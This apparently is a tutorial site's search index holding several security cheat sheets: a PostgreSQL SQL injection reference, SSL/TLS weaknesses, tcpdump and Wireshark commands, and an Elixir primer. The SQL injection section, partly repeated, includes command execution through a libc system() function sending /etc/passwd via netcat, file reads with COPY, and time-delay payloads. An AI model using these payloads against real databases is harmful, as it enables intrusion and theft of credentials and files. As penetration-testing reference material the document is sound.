(C.relkind=‘r’) AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum\u003e0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’) Lists columns in PostgreSQL tables. This query joins several system catalogs to list columns in tables in the ‘public’ schema. List Tables SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (‘r’,’’) AND n.nspname NOT IN (‘pg_catalog’, ‘pg_toast’) AND pg_catalog.pg_table_is_visible(c.oid) Lists all tables in PostgreSQL. This query filters out system tables and lists user-defined tables. Find Tables From Column Name SELECT DISTINCT relname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=‘r’) AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum\u003e0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’) AND attname LIKE ‘%password%’; Finds PostgreSQL tables that contain a specific column. This query is useful for identifying tables with columns containing specific names, such as those related to passwords. Select Nth Row SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 0; – rows numbered from 0\nSELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 1; Retrieves the Nth row from a result set in PostgreSQL. This example demonstrates getting the first and second rows from the pg_user table. PostgreSQL rows are numbered starting from 0. Select Nth Char SELECT substr(‘abcd’, 3, 1); – returns c Retrieves the Nth character from a string in PostgreSQL. This example gets the 3rd character from ‘abcd’. Bitwise AND SELECT 6 \u0026 2; – returns 2\nSELECT 6 \u0026 1; – returns 0 Demonstrates the use of bitwise AND in PostgreSQL. The first query returns 2, and the second returns 0. ASCII Value -\u003e Char SELECT chr(65); Converts an ASCII value to its corresponding character in PostgreSQL. This example converts ASCII 65 to ‘A’. Char -\u003e ASCII Value SELECT ascii(‘A’); Converts a character to its corresponding ASCII value in PostgreSQL. This example converts ‘A’ to ASCII 65. Casting SELECT CAST(1 as varchar);\nSELECT CAST(‘1’ as int); Demonstrates how to cast data types in PostgreSQL. The first query casts the number 1 to a varchar, and the second casts the string ‘1’ to an integer. String Concatenation SELECT ‘A’ If Statement IF statements only seem valid inside functions, so aren’t much use for SQL injection. See CASE statement instead. Explains that IF statements are typically used inside PL/pgSQL functions in PostgreSQL and are not directly applicable for SQL injection. Case Statement SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END; – returns A Demonstrates the use of a CASE statement in PostgreSQL. This query returns ‘A’ if the condition (1=1) is true. Avoiding Quotes SELECT CHR(65) Time Delay SELECT pg_sleep(10); – postgres 8.2+ only\nCREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS ‘/lib/libc.so.6’, ‘sleep’ language ‘C’ STRICT; SELECT sleep(10); – priv, create your own sleep function. Taken from http://www.portcullis.co.uk/uplds/whitepapers/Having_Fun_With_PostgreSQL.pdf. Introduces methods to create a time delay in PostgreSQL SQL. The pg_sleep function pauses execution, and the second query demonstrates creating a custom sleep function. Note that the creation of a custom function requires administrative privileges. Make DNS Requests Generally not possible in postgres. However if http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.html is installed (it isn’t by default) it can be used to resolve hostnames (assuming you have DBA rights): SELECT * FROM dblink(‘host=put.your.hostname.here user=someuser dbname=somedb’, ‘SELECT version()’) RETURNS (result TEXT); Alternatively, if you have DBA rights you could run an OS-level command (see below) to resolve hostnames, e.g. “ping pentestmonkey.net”. Notes that making DNS requests through PostgreSQL is generally not possible. However, the dblink function or OS-level commands (for users with DBA rights) can be used for this purpose. Command Execution CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS ‘/lib/libc.so.6’, ‘system’ LANGUAGE ‘C’ STRICT; – priv\nSELECT system(‘cat /etc/passwd nc 10.0.0.1 8080’); – priv, commands run as postgres/pgsql OS-level user Local File Access CREATE TABLE mydata(t text);\nCOPY mydata FROM ‘/etc/passwd’; – priv, can read files which are readable by postgres OS-level user\n… UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 1; – get data back one and the second returns 0. ASCII Value -\u003e Char SELECT chr(65); Converts an ASCII value to its corresponding character in PostgreSQL. This example converts ASCII 65 to ‘A’. Char -\u003e ASCII Value SELECT ascii(‘A’); Converts a character to its corresponding ASCII value in PostgreSQL. This example converts ‘A’ to ASCII 65. Casting SELECT CAST(1 as varchar);\nSELECT CAST(‘1’ as int); Demonstrates how to cast data types in PostgreSQL SQL. The first query casts the number 1 to a varchar, and the second casts the string ‘1’ to an integer. String Concatenation SELECT ‘A’ If Statement IF statements only seem valid inside functions, so aren’t much use for SQL injection. See CASE statement instead. Notes that IF statements in PostgreSQL are typically used inside PL/pgSQL functions and are not directly applicable for SQL injection. The CASE statement is suggested as an alternative. Case Statement SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END; – returns A Demonstrates the use of a CASE statement in PostgreSQL SQL. This query returns ‘A’ if the condition is true (1=1). Avoiding Quotes SELECT CHR(65) Time Delay SELECT pg_sleep(10); – postgres 8.2+ only\nCREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS ‘/lib/libc.so.6’, ‘sleep’ language ‘C’ STRICT; SELECT sleep(10); – priv, create your own sleep function. Taken from http://www.portcullis.co.uk/uplds/whitepapers/Having_Fun_With_PostgreSQL.pdf . Introduces methods to create a time delay in PostgreSQL SQL. The pg_sleep function pauses execution for a specified number of seconds. The second method involves creating a custom sleep function using C language. This requires administrative privileges. Make DNS Requests Generally not possible in PostgreSQL. However, if http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.html is installed (it isn’t by default) it can be used to resolve hostnames (assuming you have DBA rights):\nSELECT * FROM dblink(‘host=put.your.hostname.here user=someuser dbname=somedb’, ‘SELECT version()’) RETURNS (result TEXT);\nAlternatively, if you have DBA rights you could run an OS-level command (see below) to resolve hostnames, e.g. “ping pentestmonkey.net”. Notes that making DNS requests through PostgreSQL is generally not possible. However, with certain extensions or DBA rights, there are workarounds like using dblink or OS-level commands. Command Execution CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS ‘/lib/libc.so.6’, ‘system’ LANGUAGE ‘C’ STRICT; – priv\nSELECT system(‘cat /etc/passwd nc 10.0.0.1 8080’); – priv, commands run as postgres/pgsql OS-level user "
            }
        );
    index.add(
            {
                id:  7 ,
                href: "\/tutorials\/docs\/cheatsheets\/ssl_tls_vulnerability_cs\/",
                title: "SSL/TLS Vulnerability Cheat Sheet",
                description: "Vulnerable SSL/TLS Versions\nIssue Severity Attack pre-requisites Impact Description References SSLv2 Medium MITM Exposure and tampering in real-time First released version of SSL that does not protect against MITM. Also susceptible to Bleichenbacher ‘98 (see BB98) attack to encrypt and decrypt data with server’s RSA private key. SSLv3 Low BEASTly, CBC Decryption of data POODLE attack, allows decryption of data through a padding oracle attack. BEAST, allows decryption of data through a padding oracle attack.",
                content: "Vulnerable SSL/TLS Versions\nIssue Severity Attack pre-requisites Impact Description References SSLv2 Medium MITM Exposure and tampering in real-time First released version of SSL that does not protect against MITM. Also susceptible to Bleichenbacher ‘98 (see BB98) attack to encrypt and decrypt data with server’s RSA private key. SSLv3 Low BEASTly, CBC Decryption of data POODLE attack, allows decryption of data through a padding oracle attack. BEAST, allows decryption of data through a padding oracle attack. Requires BEASTly attack model. TLSv1.0 Low BEASTly, CBC Decryption of data see BEAST DROWN Medium Adjacent network, RSA, key reuse across TLS versions Decryption of data BB98, as applied to SSLv2, to recover session keys encrypted with the server’s RSA private key, can be used in conjunction with key reuse across different available versions of SSL/TLS to recover session keys from captured sessions and decrypt application data. https://drownattack.com/ Vulnerable cipher suites\nIssue Severity Attack pre-requisites Impact Description References NULL High Adjacent network Exposure and tampering in real-time No encryption. Should only be enabled in testing. Disables encryption and integrity entirely. EXPORT High Adjacent network Exposure and tampering in real-time Intentionally weakened ciphers that only provide 40 bits of security. With specialized hardware, real-time cracking may be possible, so long-lived sessions may be MITM’d invisibly. These ciphers are sometimes exploitable even if the client does not support or choose EXPORT-grade ciphers due to the nature of the algorithms themselves. (see FREAK, Logjam) https://www.mitls.org/pages/attacks/SMACK#freak, https://weakdh.org/ DES High Adjacent network Decryption of data, but not in real time. Old cipher with small key size designed at a time when computing resources weren’t enough to brute force DES keys efficiently. Can be brute forced in roughly a week with a machine costing $10,000. http://www.sciengines.com/copacobana/ RC4 Low BEASTly Partial decryption of data. Known serious biases in keystream output can be used to decrypt data, and given enough data, recover encryption keys. The IETF has prohibited the use of RC4 in any standards-compliant version of TLS, and Mozilla and Microsoft have recommended against any use of RC4. https://en.wikipedia.org/wiki/RC4#Security 3DES/DES-CBC3/DES-EDE/Triple DES Low BEASTly, Old server version, Large amounts of data Partial decryption of data. Meet-in-the-middle attack reduces effective key strength to slightly above 112 bits. (see also SWEET32) https://sweet32.info/ Blowfish Low BEASTly, Old server version, CBC, Large amounts of data Decryption of pseudo-random blocks of data. See SWEET32. MD5 Info Theoretical Tampering MD5 has significant known collision weaknesses, with further advances HMAC-MD5 may be exploitable. https://www.win.tue.nl/hashclash/ SHA-1 / SHA Info Theoretical Tampering SHA-1 has known collision weaknesses, with further advances HMAC-SHA may be exploitable. https://shattered.io/ Anonymous DH/ECDH Medium MITM Decryption and tampering in real time Anonymous Diffie-Hellman and its elliptic curve variant is susceptible to a MITM attack that allows an attacker to establish an encrypted channel with both sides of the conversation and observe and modify traffic invisibly and in real time. SWEET32 Low BEASTly, Old server version, CBC, Large amounts of data Decryption of pseudo-random blocks of data. Random collisions in encrypted block values plus known plaintext for one of the two colliding blocks results in decryption of the other, requires hundreds of gigabytes of data for reasonable chance of success, plus large amounts of attacker-provided data. https://sweet32.info/ Certificate issues\nIssue Severity Attack pre-requisites Impact Description References Self-signed certificate / Untrusted issuer Medium Client/user acceptance, MITM Decryption and tampering in real-time The certificate is not signed by an entity in any known trust store. There is no way to validate that the signing authority is valid. see User SSL/TLS Warnings. Certificate subject mismatch Medium Client/user acceptance, MITM Decryption and tampering in real-time The certificate is not valid for the subject it is being used to protect. see User SSL/TLS Warnings. Weak signature algorithm Medium Client/user acceptance, MITM Decryption and tampering in real-time The certificate uses a known weak signing algorithm such as MD5 or SHA-1 in its digital signature. Successful bait-and-switch attacks against signing authorities have been demonstrated to generate intermediate Certificate Authorities, compromising the chain of trust and therefore, all SSL/TLS traffic. https://tools.ietf.org/id/draft-ietf-tls-md5-sha1-deprecate-00.html Revoked certificate Medium Client/user acceptance, MITM Decryption and tampering in real-time A certificate in the chain of trust was revoked, and can no longer be trusted. see User SSL/TLS Warnings. Debian faulty PRNG key High Adjacent network Decryption and tampering in real-time The key used in the certificate was generated with a version of Debian known to have serious vulnerabilities in its PRNG. Since only 65535 possible keys can be generated with such a PRNG, it is possible to keep a library of all possible key pairs, identify the key pair based on the server’s presented public key, and decrypt and modify all traffic in real-time using the corresponding private key. https://lists.debian.org/debian-security-announce/2008/msg00152.html Expired certificate Low Client/user acceptance Decryption and tampering in real-time The certificate has passed its validity period and can no longer be trusted. Validity period for certificates attempt to limit the time attackers can spend trying to brute force a private key. see User SSL/TLS Warnings. 1024-bit RSA key Low Adjacent network, significant resources Decryption and tampering in real-time The certificate has a 1024-bit modulus. Given nation-state or organized crime level resources, a single 1024-bit public key could be factored to recover the private key in a short enough time to present a practical threat, as of this writing. Over time, as computing power grows, the feasibility of this attack will only grow. 768-bit or lower RSA key High Adjacent network Decryption and tampering in real-time The certificate has a 768-bit modulus, or smaller. This is small enough to allow an attacker to factor the modulus and recover the private key using off-the-shelf hardware for a modest price. Implementation-specific vulnerabilities\nIssue Severity Attack pre-requisites Impact Description References HeartBleed Critical Old server version Disclosure of server memory. Exploits buffer overread in heartbeat TLS extension to read out server memory adjacent to buffer, often revealing request/response data or even private key material if server has just been restarted. https://heartbleed.com/ Lucky 13 Low BEASTly, Old server version, CBC Partial decryption of data. Exploits timing issue in MAC verification of certain vulnerable implementations to decrypt certain parts of encrypted data. ROBOT Medium Old server version, Adjacent network, RSA Encryption and decryption with server RSA private key A small variation on Bleichenbacher’s 1998 attack on RSA enables attacks on vulnerable TLS implementations. (see BB98) https://robotattack.org/ OpenSSL CCS Injection Medium Old server version, MITM Decryption and tampering in real-time The ChangeCipherSpec (CCS) message in the TLS handshake causes keys to be finalized. This should only occur once key material has been fully exchanged, but old versions of OpenSSL did not properly ensure this was the case. An attacker can cause keys to be generated using only public material by injecting CCS messages into TLS handshakes prematurely, then decrypt and modify traffic using the keys, which can be generated due to knowledge of the public key material used to generate them. https://www.imperialviolet.org/2014/06/05/earlyccs.html Configuration issues\nIssue Severity Attack pre-requisites Impact Description References CRIME Medium BEASTly, Old client version Decryption of request data. Compression oracle attack, applied to compressed and then encrypted HTTP requests where an attacker can obtain the encrypted data and measure its length. (see Compression Oracle) TIME Low BEASTly, Old client version Decryption of request data. CRIME, but based on timing side channel. (see Compression Oracle, CRIME) BREACH Low BEASTly, Old server version Decryption of response data. Compression oracle attack, applied to compressed and then encrypted HTTP responses. If an attacker using the BEASTly attack model against an application that reflects user input, the response data can be recovered. (see Compression Oracle) No TLS_FALLBACK_SCSV Low MITM, other vulns Downgrade Newer versions of SSL/TLS prevent an attacker from modifying the list of supported algorithms being sent by the server and client to force the use of the weakest possible algorithm. However, without the TLS_FALLBACK_SCSV extension, an attacker can force a downgrade to the weakest version of SSL/TLS supported by the client and server. Insecure renegotiation Medium MITM, Old server version, Old client version Tampering. An attacker can start a TLS session, sending some data, and then initiating a renegotiation when a client connects through a MITM channel to stitch the legitimate client into the connection, prepending arbitrary data to the request. Bit strength Difficulty Real-world example 32 Billy tries all keys in four seconds. A key was chosen poorly using only 32 effective bits of entropy 40 Billy tries all keys in 18 minutes. Normal strength of EXPORT ciphers 56 Billy tries all keys in 13 days. DES 64 Billy tries all keys in 9.7 years. Maximum strength of EXPORT ciphers 112 One billion Billies working together (a giga-Billy) try all keys in 164.6 million years. 3DES, after applying Meet-in-the-Middle attack 128 One billion giga-Billies working together (an exa-Billy) try all keys in 10,790 years. AES-128 192 An exa-Billy tries all keys in 199 sextillion years. AES-192, or the expected (but not actual) strength of 3DES 256 An exa-exa-Billy (one billion billion exa-Billies) tries all keys in 3.7 septillion years. AES-256 "
            }
        );
    index.add(
            {
                id:  8 ,
                href: "\/tutorials\/docs\/cheatsheets\/tcpdump_cs\/",
                title: "TCPdump Cheatsheet",
                description: "Command link Command Description -a Converts network and broadcast addresses to names. -A Displays each packet (excluding its link level header) in ASCII. -e Prints the link-level header on each dump line. -E Decrypt IPSEC traffic by providing an encryption key. -n Avoids converting addresses (like host addresses) to names. -N Does not print domain name qualification of host names. -S Prints absolute TCP sequence numbers. -t Omits printing of timestamp on each dump line.",
                content: "Command link Command Description -a Converts network and broadcast addresses to names. -A Displays each packet (excluding its link level header) in ASCII. -e Prints the link-level header on each dump line. -E Decrypt IPSEC traffic by providing an encryption key. -n Avoids converting addresses (like host addresses) to names. -N Does not print domain name qualification of host names. -S Prints absolute TCP sequence numbers. -t Omits printing of timestamp on each dump line. -tt Prints unformatted timestamp on each dump line. -ttt Prints delta (micro-second resolution) between current and previous line. -tttt Prints timestamp in default format proceeded by date on each dump line. -v Provides verbose output (slightly more detailed). -vv Provides more verbose output (more detailed than -v). -vvv Provides very verbose output (even more detailed than -vv). -c Exits after receiving number of packets. -F Uses as a filter file for reading packet filters. -i Captures packets from . If not specified, tcpdump selects a default interface. -r Reads packets from . -s Snaps the packet at bytes. Default is 65535. -S Prints absolute, rather than relative, TCP sequence numbers. -w Writes the raw packets to instead of parsing and printing them out. -x Prints packets in hex. -X Prints packets in hex and ASCII. Command Example usage Explanation -i any tcpdump -i any Capture from all interfaces; may require superuser (sudo/su) -i eth0 tcpdump -i eth0 Capture from the interface eth0 -c count tcpdump -i eth0 -c 5 Exit after receiving count (5) packets -r captures.pcap tcpdump -i eth0 -r captures.pcap Read and analyze saved capture file captures.pcap tcp tcpdump -i eth0 tcp Show TCP packets only udp tcpdump -i eth0 udp Show UDP packets only icmp tcpdump -i eth0 icmp Show ICMP packets only ip tcpdump -i eth0 ip Show IPv4 packets only ip6 tcpdump -i eth0 ip6 Show IPv6 packets only arp tcpdump -i eth0 arp Show ARP packets only rarp tcpdump -i eth0 rarp Show RARP packets only slip tcpdump -i eth0 slip Show SLIP packets only -I tcpdump -i eth0 -I Set interface as monitor mode -K tcpdump -i eth0 -K Don’t verify checksum -p tcpdump -i eth0 -p Don’t capture in promiscuous mode AH ARP BGP CWR DF DHCP DNS ECN ESP FTP GRE HTTP ICMP IGMP IMAP IP display link layer in hex display in hex + ASCII Acronyms Authentication Header (RFC 2402) Address Resolution Protocol (RFC 826) Border Gateway Protocol (RFC 1771) Congestion Window Reduced (RFC 2481) Do not fragment flag (RFC 791) Dynamic Host Configuration Protocol (RFC 2131) Domain Name System (RFC 1035) Explicit Congestion Notification (RFC 3168) Encapsulating Security Payload (RFC 2406) File Transfer Protocol (RFC 959) Generic Route Encapsulation (RFC 2784) Hypertext Transfer Protocol (RFC 1945) Internet Control Message Protocol (RFC 792) Internet Group Management Protocol (RFC 2236) Internet Message Access Protocol (RFC 2060) Internet Protocol (RFC 791) ISAKMP Internet Sec. Assoc. \u0026 Key Mngm Proto. (RFC 7296) L2TP Layer 2 Tunneling Protocol (RFC 2661) OSPF POP3 RFC SMTP SSH SSL TCP TLS TFTP TOS UDP Open Shortest Path First (RFC 1583) Post Office Protocol v3 (RFC 1460) Request for Comments Simple Mail Transfer Protocol (RFC 821) Secure Shell (RFC 4253) Secure Sockets Layer (RFC 6101) Transmission Control Protocol (RFC793) Transport Layer Security (RFC 5246) Trivial File Transfer Protocol (RFC 1350) Type of Service (RFC 2474) User Datagram Protocol (RFC 768)\nFilter expression Explanation src host 127.0.0.1 Filter by source IP/hostname 127.0.0.1 dst host 127.0.0.1 Filter by destination IP/hostname 127.0.0.1 host 127.0.0.1 Filter by source or destination = 127.0.0.1 ether src 01:23:45:AB:CD:EF Filter by source MAC 01:23:45:AB:CD:EF ether dst 01:23:45:AB:CD:EF Filter by destination MAC 01:23:45:AB:CD:EF ether host 01:23:45:AB:CD:EF Filter by source or destination MAC 01:23:45:AB:CD:EF src net 127.0.0.1 Filter by source network location 127.0.0.1 dst net 127.0.0.1 Filter by destination network location 127.0.0.1 net 127.0.0.1 Filter by source or destination network location 127.0.0.1 net 127.0.0.1/24 Filter by source or destination network location 127.0.0.1 with the tcpdump subnet mask of length 24 src port 80 Filter by source port = 80 dst port 80 Filter by destination port = 80 port 80 Filter by source or destination port = 80 src portrange 80-400 Filter by source port value between 80 and 400 dst portrange 80-400 Filter by destination port value between 80 and 400 portrange 80-400 Filter by source or destination port value between 80 and 400 ether broadcast Filter for Ethernet broadcasts ip broadcast Filter for IPv4 broadcasts ether multicast Filter for Ethernet multicasts ip multicast Filter for IPv4 multicasts ip6 multicast Filter for IPv6 multicasts ip src host mydevice Filter by IPv4 source hostname mydevice arp dst host mycar Filter by ARP destination hostname mycar rarp src host 127.0.0.1 Filter by RARP source 127.0.0.1 ip6 dst host mywatch Filter by IPv6 destination hostname mywatch tcp dst port 8000 Filter by destination TCP port = 8000 udp src portrange 1000-2000 Filter by source TCP ports in 1000–2000 sctp port 22 Filter by source or destination port = 22 -A\ttcpdump -i eth0 -A\tPrint each packet (minus its link level header) in ASCII. Handy for capturing web pages.Without -AWith -A\thttps://stationx.net/wp-content/uploads/2023/02/Screenshot-with-ASCII-sudo-tcpdump-twitter.jpg,https://stationx.net/wp-content/uploads/2023/02/Screenshot-without-ASCII-sudo-tcpdump-A-twitter.jpg -D\ttcpdump -D\tPrint the list of the network interfaces available on the system and on which tcpdump can capture packets.\thttps://stationx.net/wp-content/uploads/2023/02/Output-of-tcpdump-D.jpg -e\ttcpdump -i eth0 -e\tPrint the link-level header on each output line, such as MAC layer addresses for protocols such as Ethernet and IEEE 802.11. -F params.conf\ttcpdump -i eth0 -F /path/to/params.conf\tUse the file params.conf as input for the filter expression. (Ignore other expressions on the command line.) -n\ttcpdump -i eth0 -n\tDon’t convert addresses (i.e., host addresses, port numbers, etc.) to names. -S\ttcpdump -i eth0 -S\tPrint absolute, rather than relative, TCP sequence numbers. (Absolute TCP sequence numbers are longer.) –time-stamp-precision=tsp\ttcpdump -i eth0 –time-stamp-precision=nano\tWhen capturing, set the timestamp precision for the capture to tsp:• micro for microsecond (default)• nano for nanosecond. -t\ttcpdump -i eth0 -t\tOmit the timestamp on each output line. -tt\ttcpdump -i eth0 -tt\tPrint the timestamp, as seconds since January 1, 1970, 00:00:00, UTC, and fractions of a second since that time, on each dump line. -ttt\ttcpdump -i eth0 -ttt\tPrint a delta (microsecond or nanosecond resolution depending on the –time-stamp-precision option) between the current and previous line on each output line. The default is microsecond resolution. -tttt\ttcpdump -i eth0 -tttt\tPrint a timestamp as hours, minutes, seconds, and fractions of a second since midnight, preceded by the date, on each dump line. -ttttt\ttcpdump -i eth0 -ttttt\tPrint a delta (microsecond or nanosecond resolution depending on the –time-stamp-precision option) between the current and first line on each dump line. The default is microsecond resolution. -u\ttcpdump -i eth0 -u\tPrint undecoded network file system (NFS) handles. -v\ttcpdump -i eth0 -v\tProduce verbose output.When writing to a file (-w option) and at the same time not reading from a file (-r option), report to standard error, once per second, the number of packets captured. -vv\ttcpdump -i eth0 -vv\tAdditional verbose output than -v -vvv\ttcpdump -i eth0 -vvv\tAdditional verbose output than -vv -x\ttcpdump -i eth0 -x\tPrint the headers and data of each packet (minus its link level header) in hex. -xx\ttcpdump -i eth0 -xx\tPrint the headers and data of each packet, including its link level header, in hex. -X\ttcpdump -i eth0 -X\tPrint the headers and data of each packet (minus its link level header) in hex and ASCII. -XX\ttcpdump -i eth0 -XX\tPrint the headers and data of each packet, including its link level header, in hex and ASCII.\nCommand Example Explanation -w captures.pcap tcpdump -i eth0 -w captures.pcap Output capture to a file captures.pcap -d tcpdump -i eth0 -d Display human-readable form in standard output -L tcpdump -i eth0 -L Display data link types for the interface -q tcpdump -i eth0 -q Quick/quiet output. Print less protocol information, so output lines are shorter. -U tcpdump -i eth0 -U -w out.pcap Without -w optionPrint a description of each packet’s contents.With -w optionWrite each packet to the output file out.pcap in real time rather than only when the output buffer fills. Operator Syntax Example Description AND and, \u0026\u0026 tcpdump -n src 127.0.0.1 and dst port 21 Combine filtering options joined by “and” OR or, EXCEPT not, ! tcpdump dst 127.0.0.1 and not icmp Negate the condition prefixed by “not” LESS less, \u003c, (\u003c=) tcpdump dst host 127.0.0.1 and less 128 Shows packets shorter than (or equal to) 128 bytes in length.\u003c only applies to length 32, i.e., \u003c32. GREATER greater, \u003e, (\u003e=) tcpdump dst host 127.0.0.1 and greater 64 Shows packets longer than (or equal to) 64 bytes in length.\u003e only applies to length 32, i.e., \u003e32. EQUAL =, == tcpdump host 127.0.0.1 = 0 Show packets with zero length "
            }
        );
    index.add(
            {
                id:  9 ,
                href: "\/tutorials\/docs\/cheatsheets\/wireshark_cs\/",
                title: "Wireshark Cheat sheet",
                description: "Protocols - ether, fddi, ip, arp, rarp, decnet, lat, sca, moprc, mopdl, tcp and udp linkWireshark Capturing Modes link Promiscuous mode Sets interface to capture all packets on a network segment to which it is associated to Monitor mode setup the Wireless interface to capture all traffic it can receive (Unix/Linux only) Filter Types link Capture filter Filter packets during capture Display Filter Hide Packets from a capture display Capture Filter Syntax link Syntax protocol direction hosts value Logical operator Expressions Example tcp src 192.",
                content: "Protocols - ether, fddi, ip, arp, rarp, decnet, lat, sca, moprc, mopdl, tcp and udp linkWireshark Capturing Modes link Promiscuous mode Sets interface to capture all packets on a network segment to which it is associated to Monitor mode setup the Wireless interface to capture all traffic it can receive (Unix/Linux only) Filter Types link Capture filter Filter packets during capture Display Filter Hide Packets from a capture display Capture Filter Syntax link Syntax protocol direction hosts value Logical operator Expressions Example tcp src 192.168.1.1 80 and tcp dst 202.164.30.1 Display Filter Syntax link Syntax protocol String 1 String 2 Comparison Operator value logical operator Expressions Example http dest ip == 192.168.1.1 and tcp port Protocols - Values link ether, fddi, ip, arp, rarp, decnet, lat, sca, moprc, mopdl, tcp and udp\nFiltering packets (Display Filters) link Operator Description Example eq or == Equal ip.dest == 192.168.1.1 ne or != Not Equal ip.dest != 192.168.1.1 gt or \u003e Greater than frame.len \u003e 10 lt or \u003c Less than frame.len \u003c10 ge or \u003e= Greater than or Equal frame.len \u003e= 10 le or \u003c= Less than or Equal frame.len\u003c=10 Miscellaneous link Slice Operator […] - Range of values Membership Operator {} - In CTRL+E - Start/Stop Capturing Logical Operators link Operator Description Example and or \u0026\u0026 Logical AND All the conditions should match or or xor or ^^ Logical XOR exclusive alternation – Only one of the two conditions should match not both not or ! NOT(Negation) Not equal to [n] […] Substring operator Filter a specific word or text Default columns in a packet capture output link No. Frame number from the beginning of the packet capture Time Seconds from the first frame Source (src) Source address, commonly an IPv4, IPv6 or Ethernet address Destination (dst) Destination address Protocol Protocol used in the Ethernet frame, IP packet, or TCP segment Length Length of the frame in bytes Keyboard Shortcuts link Accelerator Description Accelerator Description Tab or Shift+Tab Move between screen elements, e.g. from the toolbars to the packet list to the packet detail. Alt+→ or Option+→ Move to the next packet in the selection history. ↓ Move to the next packet or detail item. → In the packet detail, opens the selected tree item. ↑ Move to the previous packet or detail item. Shift+→ In the packet detail, opens the selected tree item and all of its subtrees. Ctrl+ ↓ or F8 Move to the next packet, even if the packet list isn’t focused. Ctrl+→ In the packet detail, opens all tree items. Ctrl+ ↑ or F7 Move to the previous packet, even if the packet list isn’t focused. Ctrl+← In the packet detail, closes all tree items. Ctrl+. Move to the next packet of the conversation (TCP, UDP or IP). Backspace In the packet detail, jumps to the parent node. Ctrl+, Move to the previous packet of the conversation (TCP, UDP or IP). Return or Enter In the packet detail, toggles the selected tree item. Common Filtering Commands link Usage Filter syntax Wireshark Filter by IP ip.addr == 10.10.50.1 Filter by Destination IP ip.dest == 10.10.50.1 Filter by Source IP ip.src == 10.10.50.1 Filter by IP range ip.addr \u003e= 10.10.50.1 and ip.addr \u003c= 10.10.50.100 Filter by Multiple Ips ip.addr == 10.10.50.1 and ip.addr == 10.10.50.100 Filter out/ Exclude IP address !(ip.addr == 10.10.50.1) Filter IP subnet ip.addr == 10.10.50.1/24 Filter by multiple specified IP subnets ip.addr == 10.10.50.1/24 and ip.addr == 10.10.51.1/24 Filter by Protocol • dns • http • ftp • ssh • arp • telnet • icmp Filter by port (TCP) tcp.port == 25 Filter by destination port (TCP) tcp.dstport == 23 Filter by ip address and port ip.addr == 10.10.50.1 and Tcp.port == 25 Filter by URL http.host == “host name” Filter by time stamp frame.time \u003e= “June 02, 2019 18:04:00” Filter SYN flag tcp.flags.syn == 1 tcp.flags.syn == 1 and tcp.flags.ack == 0 Wireshark Beacon Filter wlan.fc.type_subtype = 0x08 Wireshark broadcast filter eth.dst == ff:ff:ff:ff:ff:ff WiresharkMulticast filter (eth.dst[0] \u0026 1) Host name filter ip.host = hostname MAC address filter eth.addr == 00:70:f4:23:18:c4 RST flag filter tcp.flags.reset == 1 Main Toolbar Items linklink\n"
            }
        );
    index.add(
            {
                id:  10 ,
                href: "\/tutorials\/docs\/",
                title: "FREE Quick-To-Consume Tutorials",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  11 ,
                href: "\/tutorials\/docs\/elixir\/elixir\/01_a_beginners_guide_to_elixir\/",
                title: "A beginner's guide to the Elixir programming language",
                description: "Elixir is a process-oriented, functional programming language that runs on the Erlang virtual machine (BEAM). The language was influenced by Ruby. This inspiration can be seen and felt in Elixir’s ecosystem and tooling options. Elixir is known to be easy to learn and widely applicable within the software development industry.",
                content: "In this section, we will cover:\nWhat is Elixir? Key features, tools, and uses of Elixir Intro to Elixir functional programming Simple code snippets What is Elixir? linkElixir is a general-purpose, functional, concurrent programming language designed for building applications that are reliable, scalable, and easy to maintain. Tt looks a lot like Ruby but offers features that help with handling lots of tasks at the same time (concurrency), recovering from errors quickly (fault tolerance), and low latency.\nKey features, tools, and uses of Elixir linkElixer has many cool features such as:\nElixir compiles to bytecode for the Erlang VM making it very efficient. Metaprogramming with macros and polymorphism via protocols that saves time and effort. Emphasis on higher-order functions and recursion Handle large data collections efficiently with lazy and asynchronous operations. Pattern matching which makes it easy to work with complex data. The language also has a solid set of web development tools such as:\nMix: Mix is a build tool that allows you to create projects, run tests, manage tasks, and much more. IEx: IEx, Elixir’s interactive shell, provides you with many features like auto-complete, debugging, code reloading, and more. Phoenix: Phoenix is known to be one of the best web frameworks. It’s based on the MVC architecture just like Ruby on Rails. Elixir is great for web applications of any size, web APIs (such as JSON or GraphQL), event-driven systems, distributed systems, internet of things, embedded systems, and much more.\nIntro to Elixir functional programming linkElixir is a functional programming language, which means it helps you write clear and efficient code. Here are some key concepts like:\nImmutability: In Elixir, once a value is created, it cannot be changed. This makes your code more predictable and easier to run in parallel. Functions: Functions are the main building blocks. In functional programming, pure functions are preferred because they use immutable values, depend only on their arguments, don’t have side effects beyond their return values. Impure functions are more complex and can have unpredictable results. In Elixir, functions can be passed around as arguments and return values, making the code very flexible. Declarative Code: Instead of focusing on how to solve a problem, you focus on what needs to be done. This makes your code more concise and easier to understand, leading to fewer bugs. By grasping these principles, you’ll be able to use Elixir to build efficient, reliable applications. Some basic elixir code examples linkThese are just examples of elixir basic code snippets.\nStrings\nElixir uses UTF-8 to encode strings. UTF-8 is a variable-width character encoding that uses one to four eight-bit bytes to store each code point. Strings are surrounded by double quotes, like ”this”. Let’s take a look at a simple Hello, World! in Elixir:\nIO.puts(\"Hello, World!\") Atoms\nAtoms are constants whose values are their own names. In other languages, they are called symbols. They’re typically used to enumerate over distinct values:\niex\u003e :cat :cat iex\u003e :dog :dog iex\u003e :fish :fish Booleans\nElixir supports the booleans true and false:\niex\u003e true true 